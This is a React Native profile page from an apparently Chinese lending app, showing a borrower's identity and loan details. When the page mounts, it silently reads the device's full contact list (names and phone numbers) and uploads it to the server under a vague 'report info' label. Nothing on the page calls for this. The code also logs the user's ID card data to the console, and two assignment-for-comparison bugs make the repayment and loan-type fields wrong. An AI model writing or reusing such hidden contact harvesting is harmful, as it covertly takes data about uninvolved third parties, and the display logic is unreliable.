/**
 * 用户信息页
 */
import React, { Component } from 'react';
import {
    Text,
    View,
    Image,
    ScrollView,
    TouchableOpacity
} from 'react-native';
import {connect} from 'react-redux';
import Toast from 'react-native-root-toast';
import {styles} from '../styles/pages/User.style';
import Contacts from 'react-native-contacts';
import {logout, uploadContact} from '../modules/redux/modules/auth';
import {AppImage} from '../resource/AppImage';
import NavBar from '../components/NavBar';

class User extends Component {
    constructor(props) {
        super(props);
        this.state = {
            error: ""
        };

        this.toastLongOptions = {
            position: Toast.positions.CENTER,
            duration: Toast.durations.LONG,
            shadow: true,
            animation: true,
            delay: 0,
        };

        this.toastShortOptions = {
            position: Toast.positions.CENTER,
            duration: Toast.durations.SHORT,
            shadow: true,
            animation: true,
            delay: 0,
        };

        this.toast = null;
    }

    componentWillMount() {
        console.log(this.props.userInfo);

        try {
            Contacts.getAll((err, contacts) => {
                if (err === 'denied') {

                } else {
                    let list = [];
                    if(contacts.length > 0) {
                        contacts.map((el, index)=> {
                            list[index] = {
                                mail_list_name: el.givenName,
                                mail_list_phone: el.phoneNumbers && el.phoneNumbers[0] && el.phoneNumbers[0].number,
                                personaid: this.props.userInfo && this.props.userInfo.personaApp && this.props.userInfo.personaApp.personaId
                            }
                        });
                        let data = {mailList: JSON.stringify(list)};
                        this.upload(data);
                    }
                }
            });
        }
        catch (error) {
            this.toastShort(error.message);
        }
    }

    // 上报信息
    async upload(data) {
        try {
            await this.props.uploadContact(data);
        }
        catch (error) {
            this.toastShort(error.message);
        }
    }

    // 退出登陆
    async logout() {
        try {
            await this.props.logout();
            this.props.navigator.resetTo({location: '/'});
        }
        catch (error) {
            this.setState({error: error.message});
        }
    }

    toastLong(msg) {
        this.toast && this.toast.destroy();
        this.toast = Toast.show(msg, this.toastLongOptions);
    }

    toastShort(msg) {
        this.toast && this.toast.destroy();
        this.toast = Toast.show(msg, this.toastShortOptions);
    }

    render() {
        let borrowerInfoMap = {};
        let ordermap = {};
        let personaApp = {};
        if(this.props.userInfo) {
            borrowerInfoMap = this.props.userInfo.borrowerInfoMap || {};
            ordermap = this.props.userInfo.ordermap || {};
            personaApp = this.props.userInfo.personaApp || {};
        }

        // 申请金额
        const applyAmount = ordermap.apply_money || "无";
        // 申请期限
        const applyDate = ordermap.at_name || "无";
        // 申请进度
        const applyProgress = ordermap.s_name || "无";

        // 姓名
        const name = borrowerInfoMap.real_name || "无";
        // 身份证号
        const cert = borrowerInfoMap.id_card || "无";
        // 性别
        const gender = borrowerInfoMap.sex !== undefined ? (borrowerInfoMap.sex == 1 ? "男" : "女") : "无";
        // 借款编号
        const no = ordermap.loan_number || "无";
        // 申请时间
        const time = ordermap.found_time || "无";
        // 还款方式
        const payback = ordermap.repayment_way !== undefined ? (ordermap.repayment_way = 1 ? "先息后本" : "等额等息") : "无";
        // 贷款方式
        const loan = ordermap.loan_way !== undefined ? (ordermap.loan_way = 1 ? "按揭房短拆" : (ordermap.loan_way == 2 ? "红本抵押" : "红本质押")) : "无";
        // 利息
        const interest = ordermap.interest ? ordermap.interest+"分" : "无";

        return (
            <View style={styles.container}>
                <NavBar
                    title={"我"}
                    statusBar={{hidden: true}} // ios的状态栏才有效
                />
                <View style={styles.header}>
                    <Image
                        source={AppImage.user_header_bg}
                        style={styles.header_bg}
                    >
                        <View style={{flex: 12.5}}/>
                        <Image source={AppImage.user_header_logo} style={styles.header_logo}/>
                        <View style={{flex: 6}}/>
                        <Text style={styles.header_name}>{borrowerInfoMap.real_name || personaApp.username}</Text>
                        <View style={{flex: 10}}/>
                        <View style={[styles.header_item_row, {flex: 35}]}>
                            <View style={styles.header_item}>
                                <View style={{flex: 21}}/>
                                <Text style={styles.header_item_text}>{applyAmount}</Text>
                                <View style={{flex: 17}}/>
                                <Text style={styles.header_item_title}>申请金额</Text>
                                <View style={{flex: 21}}/>
                            </View>
                            <View style={styles.header_item}>
                                <View style={{flex: 21}}/>
                                <Text style={styles.header_item_text}>{applyDate}</Text>
                                <View style={{flex: 17}}/>
                                <Text style={styles.header_item_title}>申请期限</Text>
                                <View style={{flex: 21}}/>
                            </View>
                            <View style={styles.header_item}>
                                <View style={{flex: 21}}/>
                                <Text style={styles.header_item_text}>{applyProgress}</Text>
                                <View style={{flex: 17}}/>
                                <Text style={styles.header_item_title}>审批进度</Text>
                                <View style={{flex: 21}}/>

                            </View>
                        </View>
                    </Image>
                </View>
                <ScrollView
                    style={styles.contentContainer}
                    showsVerticalScrollIndicator={false}
                >
                    <View style={styles.main_info_title_row}>
                        <View style={styles.main_info_title_line}/>
                        <Text style={styles.main_info_title_text}>借款人信息</Text>
                        <View style={styles.main_info_title_line}/>
                    </View>
                    
                    <View style={styles.main_info_list}>
                        <View style={styles.main_info_row}>
                            <Text style={styles.main_info_row_title}>借款人姓名</Text>
                            <Text style={styles.main_info_row_value}>{name}</Text>
                        </View>
                        <View style={styles.main_info_row}>
                            <Text style={styles.main_info_row_title}>借款人身份证号</Text>
                            <Text style={styles.main_info_row_value}>{cert}</Text>
                        </View>
                        <View style={styles.main_info_row}>
                            <Text style={styles.main_info_row_title}>借款人性别 </Text>
                            <Text style={styles.main_info_row_value}>{gender}</Text>
                        </View>
                        <View style={styles.main_info_row}>
                            <Text style={styles.main_info_row_title}>借款编号</Text>
                            <Text style={styles.main_info_row_value}>{no}</Text>
                        </View>
                        <View style={styles.main_info_row}>
                            <Text style={styles.main_info_row_title}>申请时间</Text>
                            <Text style={styles.main_info_row_value}>{time}</Text>
                        </View>
                        <View style={styles.main_info_row}>
                            <Text style={styles.main_info_row_title}>还款方式</Text>
                            <Text style={styles.main_info_row_value}>{payback}</Text>
                        </View>
                        <View style={styles.main_info_row}>
                            <Text style={styles.main_info_row_title}>贷款方式</Text>
                            <Text style={styles.main_info_row_value}>{loan}</Text>
                        </View>
                        <View style={styles.main_info_row}>
                            <Text style={styles.main_info_row_title}>利息</Text>
                            <Text style={styles.main_info_row_value}>{interest}</Text>
                        </View>
                    </View>
                </ScrollView>
                <TouchableOpacity
                    style={styles.logout_btn}
                    activeOpacity={1}
                    onPress={()=>this.logout()}
                >
                    <Text style={styles.logout_btn_text}>退出</Text>
                </TouchableOpacity>
            </View>
        );
    }
}

export default connect(
    state=>({
        userInfo: state.auth.userInfo
    }),
    dispatch=>({
        logout: ()=>dispatch(logout()),
        uploadContact: (data)=>dispatch(uploadContact(data)),
    })
)(User)